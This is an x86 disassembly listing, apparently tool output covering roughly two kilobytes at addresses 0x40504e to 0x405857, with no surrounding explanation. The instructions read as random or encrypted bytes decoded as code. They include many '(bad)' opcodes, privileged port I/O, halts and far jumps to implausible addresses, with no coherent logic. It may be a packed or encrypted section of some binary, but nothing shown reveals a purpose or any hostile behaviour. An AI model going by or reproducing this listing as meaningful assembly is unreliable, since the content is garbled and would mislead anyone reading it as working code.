  40504e:	xlat   BYTE PTR ds:[ebx]
  40504f:	jns    0x40500d
  405051:	mov    eax,ds:0x3f002dc5
  405056:	push   es
  405057:	retf   
  405058:	inc    ebp
  405059:	mov    al,ds:0x565065ac
  40505e:	fiadd  WORD PTR [eax+0x2e]
  405061:	jmp    0xd28dcff0
  405066:	or     al,0xbd
  405068:	mov    al,ds:0xe32f5736
  40506d:	loope  0x40505f
  40506f:	dec    ebp
  405070:	mov    WORD PTR [ebx+0x11d755a5],ds
  405076:	mov    ah,0x86
  405078:	ins    DWORD PTR es:[edi],dx
  405079:	inc    eax
  40507a:	cmp    DWORD PTR [eax+ecx*1+0x7471ebed],ebp
  405081:	push   edx
  405082:	jle    0x405100
  405084:	ret    0xebb5
  405087:	popa   
  405088:	loopne 0x40505a
  40508a:	scas   eax,DWORD PTR es:[edi]
  40508b:	and    ah,BYTE PTR [ebx-0x233a5d6]
  405091:	mov    ch,0xb9
  405093:	and    BYTE PTR [ebx],ch
  405095:	rcr    DWORD PTR [eax+ecx*8-0x42],cl
  405099:	mov    esi,0x3fb25d86
  40509e:	sti    
  40509f:	jae    0x405055
  4050a1:	ds int 0xd2
  4050a4:	stc    
  4050a5:	int3   
  4050a6:	mov    cl,0xef
  4050a8:	inc    esp
  4050a9:	dec    esp
  4050aa:	es mov al,0xf9
  4050ad:	cmp    dl,dl
  4050af:	call   0x2e0e4385
  4050b4:	daa    
  4050b5:	je     0x40509e
  4050b7:	jmp    ebp
  4050b9:	add    bl,BYTE PTR [ebx+0xf]
  4050bc:	xchg   esp,eax
  4050bd:	or     BYTE PTR [ecx],dl
  4050bf:	push   edi
  4050c0:	xchg   edi,eax
  4050c1:	inc    esi
  4050c2:	sub    edx,DWORD PTR [esp+eiz*2+0x6c]
  4050c6:	xchg   esp,eax
  4050c7:	mov    cl,0xa4
  4050c9:	jb     0x40508f
  4050cb:	cs jnp 0x4050b3
  4050ce:	imul   ebp,DWORD PTR [edi-0x6e],0x7490ac57
  4050d5:	jg     0x40506a
  4050d7:	fcomp  QWORD PTR [edx]
  4050d9:	lds    edi,FWORD PTR [esi]
  4050db:	push   eax
  4050dc:	adc    al,0xb1
  4050de:	in     al,0x80
  4050e0:	or     DWORD PTR [ebx],0x99e49dc6
  4050e6:	movhps QWORD PTR [edx-0x6e],xmm4
  4050ea:	ror    BYTE PTR [eax+eiz*1-0x4],1
  4050ee:	jnp    0x405077
  4050f0:	icebp  
  4050f1:	add    cl,BYTE PTR [ebp-0x4d]
  4050f4:	xchg   DWORD PTR gs:[eax],eax
  4050f7:	inc    esp
  4050f8:	push   ebp
  4050f9:	inc    esi
  4050fa:	sti    
  4050fb:	xor    DWORD PTR [ecx],esp
  4050fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050fe:	add    BYTE PTR [esi],0xa1
  405101:	xlat   BYTE PTR ds:[ebx]
  405102:	xchg   esi,eax
  405103:	or     al,0x45
  405105:	mov    cl,0x5
  405107:	lock xchg BYTE PTR [ebx+0x26],ch
  40510b:	call   0x38c3:0x7510694c
  405112:	cmp    eax,0xb845e06e
  405117:	aad    0xc5
  405119:	ret    
  40511a:	das    
  40511b:	add    BYTE PTR ds:[ebx],cl
  40511e:	mov    DWORD PTR [esp+ecx*1],ebx
  405121:	repnz imul esp,DWORD PTR [ecx+ebp*1+0x72fc373e],0xffffff80
  40512a:	dec    edx
  40512b:	out    0x94,al
  40512d:	je     0x405151
  40512f:	pop    esi
  405130:	das    
  405131:	push   0xffffffa7
  405133:	repnz mov al,ds:0xdd49b343
  405139:	sub    BYTE PTR [edi-0x6ee389eb],0x2
  405140:	aaa    
  405141:	pop    esi
  405142:	pop    edi
  405143:	fs and al,0xc8
  405146:	and    eax,0x44f574e9
  40514b:	mov    dl,0x38
  40514d:	jne    0x4051c9
  40514f:	in     eax,dx
  405150:	test   eax,0xc28c20
  405155:	cmp    ebx,DWORD PTR [ebx+0x15739911]
  40515b:	aaa    
  40515c:	xlat   BYTE PTR ds:[ebx]
  40515d:	xchg   DWORD PTR [ebp-0x137a9f0],edi
  405163:	or     ecx,edx
  405165:	add    cl,dh
  405167:	daa    
  405168:	xor    esp,DWORD PTR [edx-0x67ddfeb7]
  40516e:	test   al,0x50
  405170:	cld    
  405171:	test   DWORD PTR [edx+0x31],esp
  405174:	push   esi
  405175:	hlt    
  405176:	fsub   DWORD PTR [esi]
  405178:	aad    0x91
  40517a:	mov    bh,0xc8
  40517c:	mov    esi,0x2c2d4395
  405181:	(bad)  
  405182:	pop    ds
  405183:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405184:	das    
  405185:	test   al,0x4f
  405187:	(bad)  
  405189:	cli    
  40518a:	pop    ebp
  40518b:	js     0x40516c
  40518d:	jne    0x405119
  40518f:	mov    ah,0x8b
  405191:	(bad)  
  405192:	jl     0x4051c1
  405194:	outs   dx,DWORD PTR ds:[esi]
  405195:	test   eax,0xcb88d91e
  40519a:	adc    eax,0x753fd8d1
  40519f:	cmp    ebp,DWORD PTR [ecx]
  4051a1:	retf   0x33d7
  4051a4:	das    
  4051a5:	sar    DWORD PTR [ecx-0x68],1
  4051a8:	pop    ecx
  4051a9:	xor    eax,0x40439b95
  4051ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051af:	arpl   WORD PTR [ebp-0x2b545e7d],bp
  4051b5:	jl     0x4051d9
  4051b7:	outs   dx,DWORD PTR ds:[esi]
  4051b8:	hlt    
  4051b9:	cmp    eax,DWORD PTR [edi-0x53e47dc2]
  4051bf:	sub    BYTE PTR [esi],ch
  4051c1:	arpl   si,bx
  4051c3:	ja     0x40520f
  4051c5:	(bad)  
  4051c9:	ja     0x4051d9
  4051cb:	mov    eax,0xa3158035
  4051d0:	outs   dx,DWORD PTR ds:[esi]
  4051d1:	or     esp,DWORD PTR [edx]
  4051d3:	mov    ah,0x3e
  4051d5:	stc    
  4051d6:	(bad)  
  4051d7:	out    0x48,eax
  4051d9:	push   0x7b5d692a
  4051de:	adc    al,0xee
  4051e0:	fld    QWORD PTR fs:[eax+0x4d]
  4051e4:	pop    ss
  4051e5:	pop    ebp
  4051e6:	fwait
  4051e7:	pop    eax
  4051e8:	aam    0x96
  4051ea:	sbb    ebp,0x79
  4051ed:	mov    ecx,0x9af6c5af
  4051f2:	iret   
  4051f3:	test   BYTE PTR [esi-0x4c05465e],bl
  4051f9:	push   ebx
  4051fa:	xor    ch,ch
  4051fc:	and    bl,BYTE PTR [ecx+0x19]
  4051ff:	ficom  WORD PTR [edx+0x7]
  405202:	pop    ebx
  405203:	xchg   ebx,eax
  405204:	fwait
  405205:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405206:	hlt    
  405207:	xlat   BYTE PTR ds:[ebx]
  405208:	jg     0x405244
  40520a:	outs   dx,BYTE PTR ds:[esi]
  40520b:	repz mov cl,0x8e
  40520e:	sub    esi,DWORD PTR ds:0x5024fc11
  405214:	inc    eax
  405215:	mov    al,ds:0x5977d18e
  40521a:	rcl    edi,1
  40521c:	test   dh,dl
  40521e:	cmp    eax,0xe0f0410c
  405223:	call   0x16b33d8a
  405228:	cdq    
  405229:	mov    al,ds:0xbe11f64b
  40522e:	and    al,0xe1
  405230:	test   eax,0x20d67a68
  405235:	sbb    eax,0x27b86426
  40523a:	xor    al,0xef
  40523c:	push   ss
  40523d:	clc    
  40523e:	pusha  
  40523f:	jns    0x4051d0
  405241:	dec    edx
  405242:	and    BYTE PTR [esi+0x4ebd5443],ah
  405248:	xchg   edi,eax
  405249:	cs stos DWORD PTR es:[edi],eax
  40524b:	unpcklps xmm1,XMMWORD PTR [ecx-0x2483e30d]
  405252:	cmp    al,0xa6
  405254:	(bad)  
  405255:	xor    BYTE PTR [ebp-0x69ef5071],bh
  40525b:	(bad)  
  40525c:	xchg   edx,eax
  40525d:	test   ebp,eax
  40525f:	inc    edi
  405260:	cmp    al,0x73
  405262:	or     al,0x66
  405264:	paddsb mm1,QWORD PTR [ecx+0x7b]
  405268:	retf   0x2cd0
  40526b:	mov    al,0x4f
  40526d:	jg     0x4052cc
  40526f:	mov    ecx,cs
  405271:	outs   dx,BYTE PTR ds:[esi]
  405272:	xor    bh,dl
  405274:	mov    dl,0x42
  405276:	xor    edx,esp
  405278:	mov    dh,0x9f
  40527a:	sbb    eax,0xe79c8700
  40527f:	pushf  
  405280:	(bad)  [edx+0x354c12ee]
  405286:	out    0xa,al
  405288:	(bad)  
  405289:	out    dx,eax
  40528a:	inc    edi
  40528b:	inc    esi
  40528c:	fstp   TBYTE PTR [edi]
  40528e:	repnz aam 0x73
  405291:	nop
  405292:	lods   al,BYTE PTR ds:[esi]
  405293:	mov    cl,0x8f
  405295:	xor    ch,BYTE PTR [edx-0x45c8dbf7]
  40529b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40529c:	imul   ecx,DWORD PTR [ebp+ebp*1-0x46de9dba],0x436731f2
  4052a7:	jae    0x405230
  4052a9:	repz push ds
  4052ab:	mov    dl,0x59
  4052ad:	(bad)  
  4052ae:	sbb    DWORD PTR [esi],eax
  4052b0:	test   BYTE PTR [esp+ecx*4-0x11],cl
  4052b4:	outs   dx,BYTE PTR ds:[esi]
  4052b5:	mov    eax,0x13e9193
  4052ba:	ins    BYTE PTR es:[edi],dx
  4052bb:	icebp  
  4052bc:	ds scas eax,DWORD PTR es:[edi]
  4052be:	ror    esp,1
  4052c0:	xchg   ebp,eax
  4052c1:	sti    
  4052c2:	xlat   BYTE PTR ds:[bx]
  4052c4:	adc    DWORD PTR ds:0x58820b82,ebx
  4052ca:	sbb    al,0x25
  4052cc:	push   ds
  4052cd:	sub    eax,0x3a727474
  4052d2:	fwait
  4052d3:	inc    edi
  4052d4:	stc    
  4052d5:	jae    0x4052f8
  4052d7:	pop    es
  4052d8:	sti    
  4052d9:	jno    0x4052ce
  4052db:	xchg   edi,eax
  4052dc:	push   ebp
  4052dd:	push   ds
  4052de:	sbb    bh,BYTE PTR ss:[esi+0x64]
  4052e2:	retf   0x2d3f
  4052e5:	xor    bl,BYTE PTR [edi+0x6f21f00e]
  4052eb:	daa    
  4052ec:	sbb    eax,0xc7a23c83
  4052f1:	aam    0x87
  4052f3:	pop    esp
  4052f4:	shr    DWORD PTR [eax],cl
  4052f6:	mov    dh,0x66
  4052f8:	sub    bx,WORD PTR [esi+eiz*2+0x1a5d2ffa]
  405300:	retf   
  405301:	sub    al,0x89
  405303:	mov    dh,0x94
  405305:	cmp    eax,0xc3a9d98c
  40530a:	or     dh,bl
  40530c:	push   ebp
  40530d:	fwait
  40530e:	jns    0x405377
  405310:	mov    dl,0x49
  405312:	stos   DWORD PTR es:[edi],eax
  405313:	data16 adc al,0x70
  405316:	jo     0x405300
  405318:	cdq    
  405319:	dec    esp
  40531a:	push   edx
  40531b:	push   es
  40531c:	ret    
  40531d:	icebp  
  40531e:	hlt    
  40531f:	addr16 jmp 0x28f4:0xf9c19eb
  405327:	mov    esi,0xf595d0a7
  40532c:	sub    al,0x8d
  40532e:	out    0x7b,al
  405330:	mov    esp,0xb2abed26
  405335:	and    al,0x7f
  405337:	gs xor dl,cl
  40533a:	sub    DWORD PTR [esi-0x7c81b25f],eax
  405340:	clc    
  405341:	je     0x405383
  405343:	mov    dl,0x75
  405345:	sbb    DWORD PTR es:[eax-0x21],0x38
  40534a:	dec    eax
  40534b:	pop    eax
  40534c:	mov    ?,WORD PTR [ecx]
  40534e:	sub    esi,edx
  405350:	rcl    BYTE PTR [edi+0x492d0b87],1
  405356:	mov    ds:0x5f3716b0,al
  40535b:	or     eax,0x5682de8c
  405360:	arpl   WORD PTR [eax-0x4f],dx
  405363:	sbb    ebp,DWORD PTR [ecx+0x6b]
  405366:	test   al,0x3c
  405368:	in     al,dx
  405369:	push   es
  40536a:	and    al,0x32
  40536c:	lahf   
  40536d:	fldenv [ebx]
  40536f:	stos   DWORD PTR es:[edi],eax
  405370:	repnz sahf 
  405372:	or     cl,dl
  405374:	gs mov dh,0xce
  405377:	shr    DWORD PTR [ebx+0x6f289533],cl
  40537d:	sbb    BYTE PTR [ecx-0x12d3ffa9],bl
  405383:	cmp    DWORD PTR [ecx],ebx
  405385:	pop    ebx
  405386:	pop    es
  405387:	clc    
  405388:	dec    eax
  405389:	sub    BYTE PTR [esi+0x6b],ch
  40538c:	jbe    0x405395
  40538e:	push   eax
  40538f:	and    eax,0xa1a590c9
  405394:	test   eax,0xab3c5810
  405399:	mov    esi,0x5b527642
  40539e:	mov    bl,0xf
  4053a0:	sbb    BYTE PTR [eax-0x6b51e210],ch
  4053a6:	test   DWORD PTR [ebp+edi*1+0x2e],esp
  4053aa:	push   edx
  4053ab:	fldenv [eax+0x7efbd1bc]
  4053b1:	call   0x36a94fd0
  4053b6:	dec    ebx
  4053b7:	into   
  4053b8:	sahf   
  4053b9:	(bad)  
  4053bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053bc:	cmp    BYTE PTR fs:0xe91e21c2,0x2a
  4053c4:	mov    edx,0xdd51e9bb
  4053c9:	adc    ecx,eax
  4053cb:	js     0x40537c
  4053cd:	and    edx,DWORD PTR [ebx]
  4053cf:	inc    ecx
  4053d0:	xor    BYTE PTR ds:[edi+0x3fcfdde7],cl
  4053d7:	add    BYTE PTR [ecx+0x22],0x4f
  4053db:	ret    
  4053dc:	jmp    0x11a3dd9b
  4053e1:	ja     0x4053f0
  4053e3:	outs   dx,BYTE PTR ds:[esi]
  4053e4:	mov    esp,DWORD PTR [ecx-0xb2505de]
  4053ea:	inc    ecx
  4053eb:	inc    edx
  4053ec:	mov    ecx,0xc68e5d75
  4053f1:	xchg   ebp,eax
  4053f2:	les    ebp,FWORD PTR [edi-0x73]
  4053f5:	mov    dl,0x4b
  4053f7:	inc    edx
  4053f8:	xchg   edx,eax
  4053f9:	xor    eax,0x71fb61b4
  4053fe:	imul   ecx,DWORD PTR [ebx+edi*2],0x48fc3929
  405405:	out    dx,al
  405406:	mov    ebp,0x4459e990
  40540b:	scas   al,BYTE PTR es:[edi]
  40540c:	sbb    esp,DWORD PTR [edx-0x2a]
  40540f:	push   esi
  405410:	pop    ds
  405411:	cmp    esp,DWORD PTR [edx-0x662dcb3f]
  405417:	sub    edx,DWORD PTR [edi]
  405419:	jmp    0x4053e4
  40541b:	sbb    al,BYTE PTR [edx-0x64d4bb]
  405421:	xor    esp,DWORD PTR [edx]
  405423:	test   eax,0x54c1871d
  405428:	add    al,0x34
  40542a:	jmp    0x78760473
  40542f:	loopne 0x4053ce
  405431:	daa    
  405432:	repnz adc al,0xd2
  405435:	add    eax,0xa1f0dcef
  40543a:	addr16 push ebx
  40543c:	dec    eax
  40543d:	mov    edx,0xcda0623a
  405442:	lods   al,BYTE PTR ds:[esi]
  405443:	nop
  405444:	scas   al,BYTE PTR es:[edi]
  405445:	test   eax,0xcc2c10ae
  40544a:	add    eax,esi
  40544c:	mov    cl,0x5
  40544e:	fdiv   st(2),st
  405450:	inc    esi
  405451:	cwde   
  405452:	out    0x8b,eax
  405454:	enter  0xcd98,0xc3
  405458:	lea    edi,[edx-0x27fc1ba7]
  40545e:	jp     0x4054b1
  405460:	xlat   BYTE PTR ds:[ebx]
  405461:	in     eax,0x56
  405463:	loop   0x4054af
  405465:	xchg   BYTE PTR [ecx+0x2c],dl
  405468:	mul    DWORD PTR [eax]
  40546a:	sbb    BYTE PTR [ebx+0x20],dl
  40546d:	ds mov bh,0x31
  405470:	add    edx,DWORD PTR ds:0xf854a6c7
  405476:	sbb    BYTE PTR ds:0x91c4d8c5,bl
  40547c:	(bad)  
  40547d:	mov    edx,0xefd79232
  405482:	adc    BYTE PTR [ebx+0x14d7c1cc],dh
  405488:	push   esp
  405489:	fadd   QWORD PTR [edi-0x1c]
  40548c:	enter  0xc4ed,0xd5
  405490:	jnp    0x4054a4
  405492:	jl     0x40544b
  405494:	ret    
  405495:	(bad)  
  405496:	dec    ecx
  405497:	das    
  405498:	fistp  DWORD PTR [edi+eiz*1]
  40549b:	int3   
  40549c:	out    0x32,al
  40549e:	(bad)  
  40549f:	fbld   TBYTE PTR [ebp+edi*8+0x7b364217]
  4054a6:	test   eax,0xd59845c
  4054ab:	mov    edx,0xc8abca2d
  4054b0:	fdivrp st(2),st
  4054b2:	ins    BYTE PTR es:[edi],dx
  4054b3:	lods   eax,DWORD PTR ds:[esi]
  4054b4:	inc    edx
  4054b5:	and    BYTE PTR [eax+edx*2+0x13f68bd4],dh
  4054bc:	or     BYTE PTR [ebx-0x10],bh
  4054bf:	fisub  DWORD PTR [ecx+esi*4+0x77c49bce]
  4054c6:	or     eax,0x60d5d8e4
  4054cb:	mov    esp,0xbf8b63ea
  4054d0:	shl    BYTE PTR [ecx],1
  4054d2:	(bad)  [ebp-0xbe992f6]
  4054d8:	dec    edi
  4054d9:	popf   
  4054da:	rcr    DWORD PTR ds:0x78aeb9da,1
  4054e0:	stos   BYTE PTR es:[edi],al
  4054e1:	dec    eax
  4054e2:	fwait
  4054e3:	xchg   ecx,eax
  4054e4:	loope  0x4054da
  4054e6:	push   ecx
  4054e7:	mov    ds:0xdbbf04b2,eax
  4054ec:	push   edx
  4054ed:	fsub   QWORD PTR [ecx]
  4054ef:	pop    ebp
  4054f0:	(bad)  
  4054f1:	aaa    
  4054f2:	fistp  QWORD PTR ds:0x57bb9e68
  4054f8:	or     DWORD PTR [ecx+0x1c],ebp
  4054fb:	aam    0x5e
  4054fd:	arpl   WORD PTR [ebx-0x11ab975c],si
  405503:	and    DWORD PTR [ecx+0x7d0780db],ebx
  405509:	sbb    bl,dl
  40550b:	test   DWORD PTR [esi],edi
  40550d:	xor    eax,0x182bd73b
  405512:	arpl   si,si
  405514:	or     DWORD PTR [edx-0x3],edx
  405517:	jnp    0x4054a3
  405519:	std    
  40551a:	add    cl,BYTE PTR [ebx]
  40551c:	inc    ebx
  40551d:	or     DWORD PTR [eax+0x56e9ec26],ebx
  405523:	das    
  405524:	nop
  405525:	das    
  405526:	cmp    DWORD PTR [edx+0x66460129],0xef9cbeae
  405530:	(bad)  
  405531:	ror    DWORD PTR [ebx+edx*4+0x5043eda7],cl
  405538:	pop    edx
  405539:	das    
  40553a:	push   ds
  40553b:	stc    
  40553c:	rcr    ebx,cl
  40553e:	adc    al,0xf0
  405540:	addr16 fcomip st,st(0)
  405543:	xor    BYTE PTR [edi+ebx*2+0x77538f53],0x71
  40554b:	(bad)  
  40554c:	adc    bh,BYTE PTR [edx+0x52]
  40554f:	aas    
  405550:	and    eax,0x5abc7281
  405555:	(bad)  
  405556:	inc    ax
  405558:	sbb    DWORD PTR [ecx+0x57d109cc],ebp
  40555e:	es nop
  405560:	pop    eax
  405561:	pop    eax
  405562:	cmp    BYTE PTR [eax-0x24],ah
  405565:	inc    edx
  405566:	jecxz  0x40550d
  405568:	mov    dh,BYTE PTR [edx-0x2464552e]
  40556e:	and    esi,DWORD PTR [ecx]
  405570:	data16 mov bh,0x62
  405573:	xchg   esp,eax
  405574:	clc    
  405575:	outs   dx,BYTE PTR ds:[esi]
  405576:	loopne 0x4055bf
  405578:	jmp    0x4055e5
  40557a:	loope  0x4055de
  40557c:	call   0x719d6561
  405581:	adc    BYTE PTR [esi-0x49],0xe7
  405585:	enter  0x9d76,0x78
  405589:	out    dx,eax
  40558a:	sub    BYTE PTR [ebx-0x2a1cb5de],ah
  405590:	test   al,0x2f
  405592:	arpl   di,bx
  405594:	fwait
  405595:	aam    0x62
  405597:	mov    ebx,0x3b190abd
  40559c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40559d:	mov    edx,0x4321e10f
  4055a2:	and    al,0x57
  4055a4:	mov    al,0xd6
  4055a6:	fs mov bh,0x1f
  4055a9:	mov    cl,0x9b
  4055ab:	shl    DWORD PTR [esi+0x50867493],1
  4055b1:	push   cs
  4055b2:	aaa    
  4055b3:	sub    ah,bl
  4055b5:	cmp    BYTE PTR [esi+0x52],0xc6
  4055b9:	jge    0x4055e8
  4055bb:	cmp    ecx,DWORD PTR [edx+0x5e61b2e8]
  4055c1:	adc    BYTE PTR [ebx+0x728034c2],0x47
  4055c8:	ins    BYTE PTR es:[edi],dx
  4055c9:	out    0xb0,eax
  4055cb:	xchg   esp,eax
  4055cc:	jg     0x40555d
  4055ce:	call   DWORD PTR [esi-0x75566cc7]
  4055d4:	xor    DWORD PTR [ebx-0x712ee905],0x5
  4055db:	mov    ah,BYTE PTR [esi-0x61a504a9]
  4055e1:	xchg   esp,eax
  4055e2:	stos   BYTE PTR es:[edi],al
  4055e3:	(bad)  
  4055e4:	rcl    ebx,1
  4055e6:	loope  0x4055cc
  4055e8:	mov    al,BYTE PTR ds:0x7ceabf5f
  4055ee:	inc    edx
  4055ef:	fwait
  4055f0:	aam    0x16
  4055f2:	stos   BYTE PTR es:[edi],al
  4055f3:	loopne 0x40559f
  4055f5:	pop    ds
  4055f6:	lods   al,BYTE PTR ds:[esi]
  4055f7:	popa   
  4055f8:	dec    edx
  4055f9:	pop    ds
  4055fa:	sar    DWORD PTR [ecx+0x7a],cl
  4055fd:	ins    BYTE PTR es:[edi],dx
  4055fe:	xchg   esp,eax
  4055ff:	and    al,0x1e
  405601:	add    BYTE PTR [esi+0x5ac9d282],0x74
  405608:	das    
  405609:	and    al,0x4a
  40560b:	push   ebx
  40560c:	adc    DWORD PTR [ebx],ebx
  40560e:	mov    bh,0x6
  405610:	inc    eax
  405611:	cwde   
  405612:	fcomp  st(1)
  405614:	loop   0x405663
  405616:	lea    eax,[ebp+eiz*8+0x1975dbf]
  40561d:	mov    ebp,0xe5d24fae
  405622:	or     ebp,DWORD PTR [edi+eiz*4+0x7e]
  405626:	mov    ecx,0xdccb8cb5
  40562b:	ss pop ebx
  40562d:	test   edi,esi
  40562f:	jmp    0x601c:0x5e2ec3c7
  405636:	xchg   edx,eax
  405637:	fisub  DWORD PTR [edx]
  405639:	mov    ch,0x83
  40563b:	xor    ebx,DWORD PTR [edi-0x38]
  40563e:	push   cs
  40563f:	shr    ch,1
  405641:	sub    ebp,esi
  405643:	(bad)  
  405644:	mov    dh,0x3b
  405646:	xchg   DWORD PTR [ecx+0x5e289c03],esp
  40564c:	push   ecx
  40564d:	les    eax,FWORD PTR [ebp-0x237d55ea]
  405653:	enter  0x3364,0x84
  405657:	test   eax,0x37777a59
  40565c:	dec    ecx
  40565d:	ins    DWORD PTR es:[edi],dx
  40565e:	xlat   BYTE PTR ds:[ebx]
  40565f:	mov    edi,0x3d26a12e
  405664:	and    esp,DWORD PTR [ebp-0x67]
  405667:	add    al,cl
  405669:	sub    eax,0xa7008c66
  40566e:	xchg   edi,eax
  40566f:	ret    0xe6db
  405672:	adc    DWORD PTR [edi-0x44133869],edi
  405678:	xchg   dh,dh
  40567a:	cmp    al,0xc
  40567c:	mov    ah,0xf1
  40567e:	(bad)  
  40567f:	dec    ecx
  405680:	pop    esi
  405681:	(bad)  
  405682:	cmp    DWORD PTR [ebp-0x341b657],edx
  405688:	es call 0x264d2d37
  40568e:	xchg   esp,eax
  40568f:	daa    
  405690:	clc    
  405691:	cs cld 
  405693:	and    DWORD PTR [eax],ecx
  405695:	pop    ebp
  405696:	out    0x74,al
  405698:	test   al,0xc
  40569a:	push   es
  40569b:	ja     0x405669
  40569d:	pop    eax
  40569e:	sbb    DWORD PTR [edi+0x6f],eax
  4056a1:	fdivr  st,st(7)
  4056a3:	jg     0x4056b5
  4056a5:	sbb    eax,0xcfc7f85a
  4056aa:	mov    cl,0x17
  4056ac:	outs   dx,DWORD PTR ds:[esi]
  4056ad:	mov    eax,0x6fbc9d28
  4056b2:	gs xchg esi,eax
  4056b4:	xor    BYTE PTR [ebx+0x2d0f7bcf],bh
  4056ba:	pop    eax
  4056bb:	mov    eax,0x2e910505
  4056c0:	mov    al,0x34
  4056c2:	rcr    BYTE PTR [eax+eiz*2-0x57274cb9],cl
  4056c9:	bound  eax,QWORD PTR [esi-0x56]
  4056cc:	retf   
  4056cd:	mov    DWORD PTR [eax-0x5969de3e],ebp
  4056d3:	sbb    DWORD PTR [edx-0x1a354b87],0x6e
  4056da:	dec    esp
  4056db:	gs pushw cs
  4056de:	outs   dx,BYTE PTR ds:[esi]
  4056df:	xor    edx,ebp
  4056e1:	retf   0x9718
  4056e4:	dec    DWORD PTR [eax-0x1c7150a]
  4056ea:	mov    dl,0x50
  4056ec:	ret    
  4056ed:	push   esi
  4056ee:	fwait
  4056ef:	sbb    al,al
  4056f1:	test   eax,0xe104c2ba
  4056f6:	add    al,0x5c
  4056f8:	test   DWORD PTR cs:[ebx],edx
  4056fb:	lea    ebp,[esi+0x55e32bc4]
  405701:	mov    dh,0xa3
  405703:	xchg   edx,eax
  405704:	leave  
  405705:	in     al,0x62
  405707:	mov    bl,0xd0
  405709:	inc    edi
  40570a:	(bad)  
  40570b:	push   0x62
  40570d:	sar    DWORD PTR [edi-0x6f67a9bd],cl
  405713:	adc    bl,BYTE PTR [edx]
  405715:	dec    edi
  405716:	or     eax,edi
  405718:	mov    edi,0x37c5d61a
  40571d:	shl    ecx,cl
  40571f:	outs   dx,DWORD PTR ds:[esi]
  405720:	push   edi
  405721:	dec    esp
  405722:	repz ja 0x40579b
  405725:	inc    edi
  405726:	loopne 0x405761
  405728:	test   BYTE PTR [ecx+ebx*4-0x77],ch
  40572c:	and    DWORD PTR [esi+0x53],ebp
  40572f:	int    0x62
  405731:	call   0x31a22df
  405736:	in     al,dx
  405737:	adc    al,BYTE PTR ds:0x7cc2df6
  40573d:	mov    esi,ebp
  40573f:	pop    edx
  405740:	mov    bh,0x6a
  405742:	mov    eax,0xe0f4e3c4
  405747:	pop    ebx
  405748:	or     DWORD PTR [ecx+edi*4-0x15],edi
  40574c:	ja     0x4057c5
  40574e:	inc    esi
  40574f:	pop    ecx
  405750:	retf   
  405751:	add    eax,0x245e038f
  405756:	hlt    
  405757:	xchg   edi,eax
  405758:	cmp    eax,0x777f53d7
  40575d:	jae    0x405741
  40575f:	ret    
  405760:	ret    
  405761:	(bad)  
  405762:	or     edx,esi
  405764:	(bad)  
  405765:	(bad)  
  405766:	fcom   st(4)
  405768:	ins    BYTE PTR es:[edi],dx
  405769:	loope  0x4056eb
  40576b:	sbb    ah,BYTE PTR [edx+ebp*2+0x7043b7a7]
  405772:	pop    ecx
  405773:	aas    
  405774:	add    dh,0xc7
  405777:	add    BYTE PTR [eax],bh
  405779:	out    dx,al
  40577a:	mov    eax,0x4a489d53
  40577f:	leave  
  405780:	pop    ss
  405781:	retf   0x65a5
  405784:	sub    cl,BYTE PTR [esi-0x34]
  405787:	or     eax,0xe759b2b6
  40578c:	xchg   edi,eax
  40578d:	dec    edi
  40578e:	xor    al,0xb5
  405790:	(bad)  
  405791:	pop    ecx
  405792:	push   ebx
  405793:	or     al,0x66
  405795:	jo     0x4057cb
  405797:	popa   
  405798:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40579a:	call   0xfcebc96f
  40579f:	jp     0x4057f9
  4057a1:	inc    edx
  4057a2:	mov    edx,DWORD PTR [ecx+edx*4+0x7c95a64]
  4057a9:	(bad)  
  4057aa:	fnstcw WORD PTR [ebp+0x4d9ca15b]
  4057b0:	dec    edi
  4057b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057b2:	aas    
  4057b3:	loop   0x405762
  4057b5:	cmp    eax,0xd229d823
  4057ba:	into   
  4057bb:	push   ds
  4057bc:	pop    esi
  4057bd:	mov    edi,0x8efcd47b
  4057c2:	call   0x3e588cb0
  4057c7:	jno    0x4057c4
  4057c9:	add    esi,DWORD PTR [esi+ecx*1]
  4057cc:	enter  0x1eb7,0x59
  4057d0:	sbb    al,dl
  4057d2:	dec    esi
  4057d3:	das    
  4057d4:	dec    ebx
  4057d5:	retf   0x4195
  4057d8:	pop    eax
  4057d9:	retf   
  4057da:	jno    0x4057d6
  4057dc:	sbb    ebp,0x4efc8cb7
  4057e2:	adc    DWORD PTR [ecx+0x6e],esi
  4057e5:	xor    al,BYTE PTR [ebx-0x33b6077d]
  4057eb:	mov    ds:0x432584c3,eax
  4057f0:	ret    0xc51a
  4057f3:	jecxz  0x4057a0
  4057f5:	jg     0x4057aa
  4057f7:	leave  
  4057f8:	bound  ebp,QWORD PTR [edi+eax*1-0x330ab04a]
  4057ff:	hlt    
  405800:	outs   dx,DWORD PTR ds:[esi]
  405801:	(bad)  
  405802:	(bad)  
  405803:	in     eax,dx
  405804:	lock (bad) 
  405806:	pop    ebx
  405807:	mov    BYTE PTR [edx-0x59],dh
  40580a:	add    eax,0xaafdbf8e
  40580f:	retf   
  405810:	int    0x94
  405812:	clc    
  405813:	into   
  405814:	xor    BYTE PTR [ebp-0x30],0x84
  405818:	div    bl
  40581a:	inc    eax
  40581b:	cwde   
  40581c:	aaa    
  40581d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40581e:	push   ebp
  40581f:	push   0xfffffffc
  405821:	pusha  
  405822:	pop    edi
  405823:	fsincos 
  405825:	ret    0xab16
  405828:	sbb    al,0xe7
  40582a:	mov    WORD PTR [edi+0x3],cs
  40582d:	or     eax,0x983b34e8
  405832:	add    edx,ebp
  405834:	jle    0x4057d3
  405836:	cmpxchg BYTE PTR [eax],ah
  405839:	out    dx,eax
  40583a:	(bad)  
  40583b:	test   BYTE PTR [edi],0xd6
  40583e:	add    ecx,DWORD PTR [esi]
  405840:	push   eax
  405841:	mov    eax,0x429849eb
  405846:	pop    eax
  405847:	leave  
  405848:	in     al,dx
  405849:	push   0x11
  40584b:	ret    0x3d40
  40584e:	js     0x4058cf
  405850:	xor    al,0x2e
  405852:	jbe    0x4057ef
  405854:	inc    ecx
  405855:	mov    ah,0xf
  405857:	stc    
